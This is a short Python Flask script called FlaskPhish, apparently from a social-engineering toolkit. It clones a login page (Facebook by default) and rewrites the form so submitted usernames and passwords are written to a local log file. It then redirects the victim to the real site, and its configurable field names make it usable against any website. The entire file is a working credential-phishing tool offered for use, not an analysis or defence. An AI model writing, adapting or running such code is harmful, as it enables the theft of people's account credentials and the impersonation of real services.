#!/usr/bin/env python
import re
from flask import Flask, request
import requests

def FlaskPhish():
########################################################################
########### WHATEVER URL HERE ##########################################
    url = 'https://www.facebook.com' ###################################
####### CHANGE THESE FIELDS TO WHATEVER THEY ARE ARE IN THE WEBSITE ####
    field1 = 'email' ## USERNAME FIELD #################################
    field2 = 'pass'  ## PASSWORD FIELD #################################
########################################################################

    def mirror():
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'Referer': '{}'.format(url)}
        req = requests.get(url, headers=headers)
        data = re.sub(r'(?<=action\=\")(.*?)\"', '/"', req.text)
        return data

    def phish(email,password):
        with open("log.txt", "a") as log:
            log.write('------------------------\nWebsite: ' + url)
            log.write('\nUser: {} - Password: {}\n------------------------'.format(email,password))

    pySE = Flask(__name__)
    @pySE.route('/', methods=['POST', 'GET'])
    def home():
        try:
            if request.method == 'POST': 
                print " [+] CAUGHT A POST! POSSIBLE USERNAME AND PASSWORD CAUGHT! CHECK LOG.TXT!"
                phish(request.form[field1], request.form[field2])
                return '<script>window.location="{}";</script>'.format(url)
            elif request.method == 'GET':
                return mirror(), 200
        except Exception as e:
            print("ERROR! \nHere is the error:\n{}".format(e))


    if __name__ == '__main__':
        pySE.run(host='0.0.0.0', port=5000, threaded=True)

FlaskPhish()
